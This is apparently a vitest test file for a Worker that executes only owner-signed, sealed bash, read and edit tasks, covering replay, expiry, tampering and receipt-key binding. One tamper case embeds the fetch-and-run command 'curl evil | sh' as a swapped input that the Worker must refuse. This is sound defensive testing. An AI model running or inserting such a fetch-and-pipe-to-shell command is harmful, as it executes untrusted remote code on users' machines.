import { expect, test, vi } from "vitest";
import type { ConvexClient } from "convex/browser";
import { getFunctionName, type FunctionReturnType } from "convex/server";
import { api } from "backend/convex/_generated/api";
import {
  buildAad,
  chatKeyBindingStatement,
  chatKeyStatement,
  generateEncryptionKeyPair,
  generateSigningKeyPair,
  openBox,
  openRequestSender,
  openSym,
  pad,
  sign,
  toBase64Url,
  toolApprovalStatement,
  toolGrantStatement,
  utf8,
  verify,
  type ChatScopeName,
  type ToolReceiptRecipient,
  type EncryptionKeyPair,
  type SigningKeyPair,
} from "radium-crypto";
import {
  WORKER_GRANT_TTL_MS,
  workerChatTaskRequestId,
  workerReceiptAad,
  workerTaskAad,
  type WorkerSealedTaskRequest,
} from "backend/src/worker/task-contract";
import type { Id } from "backend/convex/_generated/dataModel";
import type { ActionCtx } from "backend/convex/_generated/server";
import type { CodeModeOutput } from "backend/src/chatroom/code-mode";
import { createCodeMode } from "backend/src/chatroom/code-mode-runtime";
import { buildWorkerChatTools, workerCodeModeInteractions } from "backend/src/worker/chat-tools";
import { consumeEditTasks, type TaskTrust } from "./tasks.js";

type Task = FunctionReturnType<typeof api.worker_tasks.assigned>[number];

const workspaceId = "workspace";
const workerId = "worker";
const chatId = "chat";
const directory = "/repo";

type Fixture = {
  worker: EncryptionKeyPair;
  chatKey: EncryptionKeyPair;
  owner: SigningKeyPair;
  member: SigningKeyPair;
  trust: TaskTrust;
  marks: Map<string, number>;
};

async function fixture(): Promise<Fixture> {
  const [worker, chatKey, owner, member] = await Promise.all([
    generateEncryptionKeyPair(),
    generateEncryptionKeyPair(),
    generateSigningKeyPair(),
    generateSigningKeyPair(),
  ]);
  const users = new Map([
    ["owner-key", { userId: "owner", role: "owner" as const, keys: owner }],
    ["member-key", { userId: "member", role: "member" as const, keys: member }],
  ]);
  const marks = new Map<string, number>();
  const claims = new Map<string, number>();
  const pins = new Map<string, string>();
  // Mirrors WorkerTrust: a known roster identity whose signature verifies, else null.
  const trust: TaskTrust = {
    workspaceId,
    workerId,
    encryptionSeed: () => worker.seed.slice(),
    verifyUser: async ({ signerKeyId, message, signature }) => {
      const user = users.get(signerKeyId);
      if (!user || !(await verify(user.keys.publicKey, message, signature))) return null;
      return { userId: user.userId, role: user.role };
    },
    highWater: (name) => marks.get(name) ?? 0,
    advanceHighWater: async (name, value) => {
      marks.set(name, Math.max(marks.get(name) ?? 0, value));
    },
    pin: async (name, value) => {
      if (!pins.has(name)) pins.set(name, value);
      return pins.get(name) === value;
    },
    claimOnce: async (name, expiresAt) => {
      if ((claims.get(name) ?? 0) > Date.now()) return false;
      claims.set(name, expiresAt);
      return true;
    },
  };
  return { worker, chatKey, owner, member, trust, marks };
}

type Call = {
  tool: WorkerSealedTaskRequest["tool"];
  stage: WorkerSealedTaskRequest["stage"];
  toolCallId: string;
  input: unknown;
};

/** The receipt recipient {@link receiptProof} serves by default, as the signing owner saw it. */
const defaultRecipient = { chatE2eeId: "chat-e2ee", scope: "personal", creatorId: "owner" } as const;

async function approval(
  signer: SigningKeyPair,
  signerKeyId: string,
  call: Call,
  options: {
    approvedAt?: number;
    directory?: string;
    receipt?: (NonNullable<ToolReceiptRecipient> & { keyId: string }) | null;
  } = {},
): Promise<WorkerSealedTaskRequest["authorization"]> {
  const input = JSON.stringify(call.input);
  const approvedAt = options.approvedAt ?? Date.now();
  const signature = await sign(
    signer.seed,
    toolApprovalStatement({
      workspaceId,
      chatId,
      workerId,
      directory: options.directory ?? directory,
      tool: call.tool,
      toolCallId: call.toolCallId,
      input: utf8(input),
      approvedAt,
      receipt:
        options.receipt === undefined ? { ...defaultRecipient, keyId: "chat-key" } : options.receipt,
    }),
  );
  return { kind: "approval", input, approvedAt, signature: toBase64Url(signature), signerKeyId };
}

async function grant(
  signer: SigningKeyPair,
  issuedAt: number,
  receipt: ToolReceiptRecipient = defaultRecipient,
) {
  const signature = await sign(
    signer.seed,
    toolGrantStatement({
      workspaceId,
      chatId,
      workerId,
      directory,
      tools: ["read"],
      issuedAt,
      receipt,
    }),
  );
  return {
    kind: "grant" as const,
    tools: ["read" as const],
    issuedAt,
    signature: toBase64Url(signature),
    signerKeyId: "owner-key",
  };
}

type ReceiptPolicy = {
  chatId: string;
  scope: ChatScopeName;
  creatorId: string;
  members: string[];
};

/**
 * The receipt block a chat action serves: chat key epoch `epoch`, signed by `signer` (original
 * signature plus, unless `unbound`, the binding signature over `signed`), while `claim` is the
 * policy the request states. Honest requests state exactly what was signed.
 */
async function receiptProof(
  f: Fixture,
  input: {
    epoch?: number;
    signed?: Partial<ReceiptPolicy>;
    claim?: Partial<Omit<ReceiptPolicy, "chatId">>;
    unbound?: boolean;
    signer?: { keys: SigningKeyPair; keyId: string };
    publicKey?: Uint8Array;
  } = {},
): Promise<NonNullable<WorkerSealedTaskRequest["receipt"]>> {
  const { epoch = 1, unbound = false, publicKey = f.chatKey.publicKey } = input;
  const signer = input.signer ?? { keys: f.owner, keyId: "owner-key" };
  const signed: ReceiptPolicy = {
    chatId,
    scope: "personal",
    creatorId: "owner",
    members: [],
    ...input.signed,
  };
  const key = { workspaceId, chatE2eeId: "chat-e2ee", epoch, keyId: "chat-key", suite: 1, publicKey };
  const signature = await sign(signer.keys.seed, chatKeyStatement(key));
  const binding = await sign(signer.keys.seed, chatKeyBindingStatement({ ...key, ...signed }));
  return {
    e2eeId: "chat-e2ee",
    epoch,
    publicKey: toBase64Url(publicKey),
    keyId: "chat-key",
    suite: 1,
    signerKeyId: signer.keyId,
    signature: toBase64Url(signature),
    bindingSignature: unbound ? "AAAA" : toBase64Url(binding),
    scope: input.claim?.scope ?? signed.scope,
    creatorId: input.claim?.creatorId ?? signed.creatorId,
    members: input.claim?.members ?? signed.members,
  };
}

/** Seal a request to the Worker exactly as the chat action does; `receipt: null` omits it. */
async function sealedTask(
  f: Fixture,
  call: Call,
  authorization: WorkerSealedTaskRequest["authorization"],
  id: string,
  receipt?: WorkerSealedTaskRequest["receipt"] | null,
) {
  const request: WorkerSealedTaskRequest = {
    v: 1,
    workspaceId,
    chatId,
    workerId,
    directory,
    tool: call.tool,
    toolCallId: call.toolCallId,
    stage: call.stage,
    authorization,
    ...(authorization.kind === "grant" ? { input: JSON.stringify(call.input) } : {}),
    ...(receipt === null ? {} : { receipt: receipt ?? (await receiptProof(f)) }),
  };
  const requestId = await workerChatTaskRequestId(chatId, call.toolCallId, call.stage);
  const sender = await openRequestSender(f.worker.publicKey);
  const sealedRequest = await sender.seal(
    pad(utf8(JSON.stringify(request)), "content"),
    buildAad(workerTaskAad({ workspaceId, chatId, requestId, field: "request" })),
  );
  const task = {
    _id: id,
    workspace: workspaceId,
    workerId,
    requestId,
    operation: call.tool === "bash" ? "bash" : "edit",
    chatId,
    toolCallId: call.toolCallId,
    editOwnerId: "owner",
    status: "sent",
    revision: 0,
    attempt: 0,
    sealed: {
      keyId: "worker-key",
      encapsulated: sender.encapsulated.slice().buffer,
      request: sealedRequest.slice().buffer,
    },
  } as unknown as Task;
  return { task, responseKey: sender.responseKey, requestId, call, sealsReceipt: !!request.receipt };
}

/** Run raw tasks through a paired Worker's consumer; returns each `completeSealedTask` call. */
async function consume(f: Fixture, tasks: Task[]) {
  const completions = new Map<string, Record<string, unknown>>();
  const callbacks: { operation: string; callback: (tasks: Task[]) => void }[] = [];
  const client = {
    mutation: vi.fn(async (fn: unknown, args: Record<string, unknown>) => {
      const name = getFunctionName(fn as typeof api.worker_tasks.claimEdit);
      if (name === "worker_tasks:claimEdit") {
        const task = tasks.find((entry) => entry._id === args.taskId)!;
        return { ...task, status: "processing", revision: 1 };
      }
      expect(name).toBe("worker_tasks:completeSealedTask");
      completions.set(args.taskId as string, args);
      return { completed: true };
    }),
    onUpdate: (_fn: unknown, args: { operation: string }, callback: (tasks: Task[]) => void) => {
      callbacks.push({ operation: args.operation, callback });
      return () => {};
    },
  } as unknown as ConvexClient;
  const editor = {
    execute: vi.fn(async (request: { action: { kind: string } }) =>
      request.action.kind === "preview"
        ? JSON.stringify({ ok: true, action: "preview", previewId: "p-1" })
        : JSON.stringify({ ok: true, action: request.action.kind }),
    ),
    close: vi.fn(async () => {}),
  };
  const bash = {
    execute: vi.fn(async () => JSON.stringify({ ok: true, exitCode: 0, output: "done" })),
    close: vi.fn(async () => {}),
  };
  const consumer = consumeEditTasks(client, editor, bash, f.trust);
  for (const { operation, callback } of callbacks) {
    callback(tasks.filter((task) => task.operation === operation));
  }
  consumer.setAvailable(true);
  await vi.waitFor(() => expect(completions.size).toBe(tasks.length));
  await consumer.close();
  return { completions, editor, bash };
}

/** Run tasks through the consumer and open each sealed result with its request key. */
async function run(f: Fixture, tasks: Awaited<ReturnType<typeof sealedTask>>[]) {
  const { completions, editor, bash } = await consume(
    f,
    tasks.map((entry) => entry.task),
  );
  const outcomes = await Promise.all(
    tasks.map(async ({ task, responseKey, requestId, call, sealsReceipt }) => {
      const completion = completions.get(task._id)!;
      const aad = { workspaceId, chatId, requestId };
      const result = JSON.parse(
        new TextDecoder().decode(
          await openSym({
            key: responseKey,
            envelope: new Uint8Array(completion.result as ArrayBuffer),
            aad: workerTaskAad({ ...aad, field: "result" }),
          }),
        ),
      ) as { ok: boolean; code?: string; output?: string };
      if (!sealsReceipt) {
        expect(completion.receipt).toBeUndefined();
        return { ok: completion.ok, result };
      }
      const receipt = JSON.parse(
        new TextDecoder().decode(
          await openBox({
            seed: f.chatKey.seed,
            box: new Uint8Array(completion.receipt as ArrayBuffer),
            aad: workerReceiptAad({
              workspaceId,
              chatE2eeId: "chat-e2ee",
              toolCallId: call.toolCallId,
              stage: call.stage,
            }),
            pad: "content",
          }),
        ),
      );
      expect(receipt).toEqual(result);
      return { ok: completion.ok, result };
    }),
  );
  return { outcomes, editor, bash };
}

test("a paired Worker refuses a plaintext task substituted in the claim response", async () => {
  const f = await fixture();
  const signed = await sealedTask(f, bashCall, await approval(f.owner, "owner-key", bashCall), "swap");
  let callback: ((tasks: Task[]) => void) | undefined;
  const claim = vi.fn(async () => ({
    ...signed.task,
    sealed: undefined,
    bashRequest: { directory, sessionId: "session", command: "malicious", timeoutSeconds: 1 },
    status: "processing",
    revision: 1,
  }));
  const client = {
    mutation: claim,
    onUpdate: (_fn: unknown, args: { operation: string }, onUpdate: (tasks: Task[]) => void) => {
      if (args.operation === "bash") callback = onUpdate;
      return () => {};
    },
  } as unknown as ConvexClient;
  const editor = { execute: vi.fn(), close: vi.fn(async () => {}) };
  const bash = { execute: vi.fn(), close: vi.fn(async () => {}) };
  const consumer = consumeEditTasks(client, editor, bash, f.trust);
  callback!([signed.task]);
  consumer.setAvailable(true);
  await vi.waitFor(() => expect(claim).toHaveBeenCalled());
  await consumer.close();
  expect(editor.execute).not.toHaveBeenCalled();
  expect(bash.execute).not.toHaveBeenCalled();
  expect(claim).toHaveBeenCalledTimes(1);
});

const bashCall: Call = {
  tool: "bash",
  stage: "execute",
  toolCallId: "bash-1",
  input: { command: "make test", timeout: 10 },
};

test("an owner-approved Bash call runs once from the signed input; a replay is refused", async () => {
  const f = await fixture();
  const authorization = await approval(f.owner, "owner-key", bashCall);
  const first = await sealedTask(f, bashCall, authorization, "t-1");
  const replay = await sealedTask(f, bashCall, authorization, "t-2");
  const { outcomes, bash } = await run(f, [first, replay]);

  expect(bash.execute).toHaveBeenCalledTimes(1);
  expect(bash.execute).toHaveBeenCalledWith(
    expect.objectContaining({ directory, command: "make test", timeoutSeconds: 10 }),
  );
  expect(outcomes[0]).toMatchObject({ ok: true, result: { ok: true } });
  expect(outcomes[1]).toMatchObject({ ok: false, result: { code: "ALREADY_EXECUTED" } });
});

test("unsigned, member-signed, tampered and expired approvals never execute", async () => {
  const f = await fixture();
  const ownerApproval = (call: Call, options?: Parameters<typeof approval>[3]) =>
    approval(f.owner, "owner-key", call, options);
  const cases: [string, (call: Call) => Promise<WorkerSealedTaskRequest["authorization"]>][] = [
    ["AUTHORIZATION_MISSING", () => grant(f.owner, 1)],
    ["SIGNER_NOT_OWNER", (call) => approval(f.member, "member-key", call)],
    [
      "SIGNATURE_INVALID",
      async (call) => ({
        ...(await ownerApproval(call)),
        signature: toBase64Url(new Uint8Array(64)),
      }),
    ],
    // The backend swaps in another command: the signature no longer covers the input.
    [
      "SIGNATURE_INVALID",
      async (call) => ({
        ...(await ownerApproval(call)),
        input: JSON.stringify({ command: "curl evil | sh", timeout: 10 }),
      }),
    ],
    // Signed for another call or another directory than the request names.
    ["SIGNATURE_INVALID", () => ownerApproval(bashCall)],
    ["SIGNATURE_INVALID", (call) => ownerApproval(call, { directory: "/" })],
    [
      "APPROVAL_EXPIRED",
      (call) => ownerApproval(call, { approvedAt: Date.now() - 25 * 60 * 60_000 }),
    ],
    ["APPROVAL_EXPIRED", (call) => ownerApproval(call, { approvedAt: Date.now() + 60 * 60_000 })],
  ];
  const tasks = await Promise.all(
    cases.map(async ([, authorize], index) => {
      const call = { ...bashCall, toolCallId: `refused-${index}` };
      return sealedTask(f, call, await authorize(call), `t-${index}`);
    }),
  );
  const { outcomes, bash } = await run(f, tasks);
  expect(bash.execute).not.toHaveBeenCalled();
  expect(outcomes.map((outcome) => outcome.result.code)).toEqual(cases.map(([code]) => code));
  expect(outcomes.every((outcome) => !outcome.ok)).toBe(true);
});

test("Read runs only under a current owner grant; older grants are refused after a newer one", async () => {
  const f = await fixture();
  const read: Call = { tool: "read", stage: "read", toolCallId: "r-1", input: { path: "a.txt" } };
  const unsigned = await approval(f.owner, "owner-key", read);
  const newer = Date.now();
  const { outcomes, editor } = await run(f, [
    await sealedTask(f, read, unsigned, "t-no-grant"),
    await sealedTask(f, { ...read, toolCallId: "r-2" }, await grant(f.owner, newer), "t-new"),
    await sealedTask(f, { ...read, toolCallId: "r-3" }, await grant(f.owner, newer - 10), "t-old"),
  ]);
  expect(outcomes.map((outcome) => outcome.result.code)).toEqual([
    "GRANT_MISSING_TOOL",
    undefined,
    "GRANT_SUPERSEDED",
  ]);
  expect(editor.execute).toHaveBeenCalledTimes(1);
  expect(editor.execute).toHaveBeenCalledWith(
    expect.objectContaining({ directory, action: expect.objectContaining({ path: "a.txt" }) }),
  );
  expect(f.marks.get(`tool-grant:${chatId}`)).toBe(newer);
});

test("expired and far-future grants are refused without advancing the grant high-water", async () => {
  const f = await fixture();
  const read: Call = { tool: "read", stage: "read", toolCallId: "ttl-1", input: { path: "a.txt" } };
  const now = Date.now();
  const { outcomes, editor } = await run(f, [
    await sealedTask(f, read, await grant(f.owner, now - WORKER_GRANT_TTL_MS - 60_000), "expired"),
    await sealedTask(
      f,
      { ...read, toolCallId: "ttl-2" },
      await grant(f.owner, now + 60 * 60_000),
      "future",
    ),
    // A forged far-future grant must not supersede the owner's current one.
    await sealedTask(f, { ...read, toolCallId: "ttl-3" }, await grant(f.owner, now), "current"),
  ]);
  expect(outcomes.map((outcome) => outcome.result.code)).toEqual([
    "GRANT_EXPIRED",
    "GRANT_EXPIRED",
    undefined,
  ]);
  expect(editor.execute).toHaveBeenCalledTimes(1);
  expect(f.marks.get(`tool-grant:${chatId}`)).toBe(now);
});

test("an approval or grant never covers a receipt recipient other than the signed one", async () => {
  const f = await fixture();
  const read: Call = { tool: "read", stage: "read", toolCallId: "rr-1", input: { path: "a.txt" } };
  const approve = (id: string, receipt?: NonNullable<Parameters<typeof approval>[3]>["receipt"]) =>
    approval(f.owner, "owner-key", { ...bashCall, toolCallId: id }, { receipt });
  const bash = (id: string) => ({ ...bashCall, toolCallId: id });
  // A validly bound shared-chat key the server swaps in for the one the owner signed.
  const shared = await receiptProof(f, {
    signed: { scope: "shared", creatorId: "owner", members: ["owner"] },
  });
  const now = Date.now();
  const { outcomes, editor, bash: shell } = await run(f, [
    await sealedTask(f, bash("stripped"), await approve("stripped"), "stripped", null),
    await sealedTask(f, bash("swapped"), await approve("swapped"), "swapped", shared),
    // Signed for another epoch of the same chat.
    await sealedTask(
      f,
      bash("epoch"),
      await approve("epoch", { ...defaultRecipient, keyId: "older-chat-key" }),
      "epoch",
    ),
    // Signed for a keyless chat; the server adds a receipt.
    await sealedTask(f, bash("added"), await approve("added", null), "added"),
    await sealedTask(f, read, await grant(f.owner, now), "grant-stripped", null),
    await sealedTask(f, { ...read, toolCallId: "rr-2" }, await grant(f.owner, now), "grant-swapped", shared),
  ]);
  expect(outcomes.map((outcome) => outcome.result.code)).toEqual(Array(6).fill("SIGNATURE_INVALID"));
  expect(shell.execute).not.toHaveBeenCalled();
  expect(editor.execute).not.toHaveBeenCalled();
});

test("different grants with the same timestamp cannot replace one another", async () => {
  const f = await fixture();
  const read: Call = { tool: "read", stage: "read", toolCallId: "same-1", input: { path: "a.txt" } };
  const issuedAt = Date.now();
  const tools = ["read", "bash"] as const;
  const signature = await sign(
    f.owner.seed,
    toolGrantStatement({
      workspaceId,
      chatId,
      workerId,
      directory,
      tools: [...tools],
      issuedAt,
      receipt: defaultRecipient,
    }),
  );
  const conflicting = {
    kind: "grant" as const,
    tools: [...tools],
    issuedAt,
    signature: toBase64Url(signature),
    signerKeyId: "owner-key",
  };
  const { outcomes, editor } = await run(f, [
    await sealedTask(f, read, await grant(f.owner, issuedAt), "same-first"),
    await sealedTask(f, { ...read, toolCallId: "same-2" }, conflicting, "same-second"),
  ]);
  expect(outcomes.map((outcome) => outcome.result.code)).toEqual([undefined, "GRANT_SUPERSEDED"]);
  expect(editor.execute).toHaveBeenCalledTimes(1);
});

test("apply runs only a preview this Worker staged for the same signed call", async () => {
  const f = await fixture();
  const edit: Call = {
    tool: "edit",
    stage: "preview",
    toolCallId: "e-1",
    input: { patch: "*** Begin Patch\n*** End Patch" },
  };
  const signed = await approval(f.owner, "owner-key", edit);
  const orphan = { ...edit, toolCallId: "e-2", stage: "apply" as const };
  const { outcomes, editor } = await run(f, [
    await sealedTask(f, orphan, await approval(f.owner, "owner-key", orphan), "t-orphan"),
    await sealedTask(f, edit, signed, "t-preview"),
    await sealedTask(f, { ...edit, stage: "apply" }, signed, "t-apply"),
  ]);
  expect(outcomes.map((outcome) => outcome.result.code)).toEqual([
    "PREVIEW_UNKNOWN",
    undefined,
    undefined,
  ]);
  expect(editor.execute.mock.calls.map(([request]) => request.action)).toEqual([
    { kind: "preview", patch: "*** Begin Patch\n*** End Patch" },
    { kind: "apply", previewId: "p-1" },
  ]);
});

/**
 * Full Code Mode path: the chat action records the input text a prompt presents, the browser signs
 * the input it received as JSON, the action forwards the recorded text (never stored), and the
 * Worker verifies the owner's signature over it before running anything.
 */
async function codeModeApproval(browserSigns: (shown: unknown) => string) {
  const f = await fixture();
  let consumed: Awaited<ReturnType<typeof consume>> | undefined;
  const ctx = {
    runMutation: vi.fn(async (_fn: unknown, args: Record<string, unknown>) => {
      const task = {
        _id: "t-code-mode",
        workspace: workspaceId,
        workerId,
        requestId: await workerChatTaskRequestId(
          chatId,
          args.toolCallId as string,
          args.stage as "execute",
        ),
        operation: "bash",
        chatId,
        toolCallId: args.toolCallId,
        editOwnerId: "owner",
        status: "sent",
        revision: 0,
        attempt: 0,
        sealed: args.sealed,
      } as unknown as Task;
      consumed = await consume(f, [task]);
      return { taskId: task._id, replay: false };
    }),
    runQuery: vi.fn(async () => {
      const completion = consumed!.completions.get("t-code-mode")!;
      return { ok: completion.ok, result: completion.result };
    }),
  } as unknown as ActionCtx;
  const approvals = new Map();
  const { tools } = buildWorkerChatTools(ctx, {
    chatId: chatId as Id<"aisdk_chats">,
    workspaceId: workspaceId as Id<"workspaces">,
    userId: "owner",
    selection: { workerId, directory, tools: ["bash"] },
    transport: { kind: "sealed", keyId: "worker-key", encryptionPublicKey: f.worker.publicKey },
    approvals,
  });

  const prompts = new Map<string, { callId: string; shown: unknown }>();
  const interactions = workerCodeModeInteractions(
    {
      open: async (_kind, callId, input) => {
        // The prompt reaches the browser as JSON inside the streamed Code Mode snapshot.
        prompts.set("prompt-1", { callId, shown: JSON.parse(JSON.stringify(input)) });
        return "prompt-1";
      },
      response: async (id) => {
        const { callId, shown } = prompts.get(id)!;
        const approvedAt = Date.now();
        const signature = await sign(
          f.owner.seed,
          toolApprovalStatement({
            workspaceId,
            chatId,
            workerId,
            directory,
            tool: "bash",
            toolCallId: callId,
            input: utf8(browserSigns(shown)),
            approvedAt,
            // This chat has no keys: the request names no receipt.
            receipt: null,
          }),
        );
        return {
          kind: "approval",
          approved: true,
          signature: { signature: toBase64Url(signature), signerKeyId: "owner-key", approvedAt },
        };
      },
      close: async () => {},
    },
    approvals,
  );
  const codeMode = await createCodeMode({
    inventory: {
      tools: { worker_bash: { tool: tools.worker_bash!, interaction: "approval" } },
      namespaces: {},
    },
    interactions,
    catalogInDescription: false,
  });
  const stream = codeMode!.tool.execute!(
    { code: `return await tools.worker_bash({ timeout: 10, command: "make test" })` },
    { toolCallId: "execute-1", messages: [], context: undefined },
  ) as AsyncIterable<CodeModeOutput>;
  let final: CodeModeOutput | undefined;
  for await (const output of stream) final = output;
  return { final: JSON.parse(final!.output) as Record<string, unknown>, bash: consumed!.bash };
}

test("a Code Mode approval verifies on the Worker from the presented input alone", async () => {
  const { final, bash } = await codeModeApproval((shown) => JSON.stringify(shown));
  expect(final).toMatchObject({ ok: true, exitCode: 0 });
  expect(bash.execute).toHaveBeenCalledWith(
    expect.objectContaining({ directory, command: "make test", timeoutSeconds: 10 }),
  );
});

test("a Code Mode approval over any other text than the presented one fails closed", async () => {
  // Same operation, different text (key order): the Worker still refuses it.
  const { final, bash } = await codeModeApproval(() =>
    JSON.stringify({ command: "make test", timeout: 10 }),
  );
  expect(final).toMatchObject({ ok: false, code: "SIGNATURE_INVALID" });
  expect(bash.execute).not.toHaveBeenCalled();
});

/**
 * Run one approved Bash call with the given receipt block, approved by an owner who signed exactly
 * the recipient it names (so only the Worker's key checks can refuse it); no result means the
 * Worker refused it.
 */
async function receiptOutcome(f: Fixture, receipt: WorkerSealedTaskRequest["receipt"], id: string) {
  const call = { ...bashCall, toolCallId: `call-${id}` };
  const recipient = receipt && {
    chatE2eeId: receipt.e2eeId,
    scope: receipt.scope,
    creatorId: receipt.creatorId,
    keyId: receipt.keyId,
  };
  const authorization = await approval(f.owner, "owner-key", call, { receipt: recipient ?? null });
  const task = await sealedTask(f, call, authorization, id, receipt);
  const { completions, bash } = await consume(f, [task.task]);
  return { completion: completions.get(id)!, bash };
}

test("a receipt is sealed only to a chat key bound to this chat, scope and audience", async () => {
  const cases: [
    string,
    (f: Fixture) => Promise<NonNullable<WorkerSealedTaskRequest["receipt"]>>,
  ][] = [
    ["another chat's key", (f) => receiptProof(f, { signed: { chatId: "other-chat" } })],
    [
      "a workspace-scope binding claimed as personal",
      (f) => receiptProof(f, { signed: { scope: "workspace" }, claim: { scope: "personal" } }),
    ],
    ["a personal binding claimed as workspace", (f) => receiptProof(f, { claim: { scope: "workspace" } })],
    [
      "an enlarged shared member list",
      (f) =>
        receiptProof(f, {
          signed: { scope: "shared", creatorId: "member", members: ["owner"] },
          claim: { members: ["owner", "mallory"] },
        }),
    ],
    ["a substituted creator", (f) => receiptProof(f, { claim: { creatorId: "member" } })],
    ["an epoch without a binding", (f) => receiptProof(f, { unbound: true })],
    [
      "a personal chat created by someone else",
      (f) =>
        receiptProof(f, {
          signed: { creatorId: "member" },
          signer: { keys: f.member, keyId: "member-key" },
        }),
    ],
    [
      "a public key other than the signed one",
      async (f) => ({
        ...(await receiptProof(f)),
        publicKey: toBase64Url((await generateEncryptionKeyPair()).publicKey),
      }),
    ],
  ];
  for (const [label, build] of cases) {
    const f = await fixture();
    const { completion, bash } = await receiptOutcome(f, await build(f), "refused");
    expect(bash.execute, label).not.toHaveBeenCalled();
    expect(completion.result, label).toBeUndefined();
    expect(completion.receipt, label).toBeUndefined();
  }
});

test("shared and workspace receipts bound to this chat are sealed and openable", async () => {
  for (const signed of [
    { scope: "shared" as const, creatorId: "member", members: ["owner", "zed"] },
    { scope: "workspace" as const, creatorId: "member" },
  ]) {
    const f = await fixture();
    const call = { ...bashCall, toolCallId: "bound" };
    const { outcomes, bash } = await run(f, [
      await sealedTask(
        f,
        call,
        await approval(f.owner, "owner-key", call, {
          receipt: {
            chatE2eeId: "chat-e2ee",
            scope: signed.scope,
            creatorId: signed.creatorId,
            keyId: "chat-key",
          },
        }),
        "bound",
        await receiptProof(f, { signed }),
      ),
    ]);
    expect(bash.execute).toHaveBeenCalledTimes(1);
    expect(outcomes[0]).toMatchObject({ ok: true });
  }
});

test("a receipt key older than an epoch already seen for the chat is refused", async () => {
  const f = await fixture();
  const newer = await receiptOutcome(f, await receiptProof(f, { epoch: 2 }), "new");
  expect(newer.completion.receipt).toBeDefined();
  const older = await receiptOutcome(f, await receiptProof(f, { epoch: 1 }), "old");
  expect(older.completion.result).toBeUndefined();
  expect(older.completion.receipt).toBeUndefined();
  expect(older.bash.execute).not.toHaveBeenCalled();
});
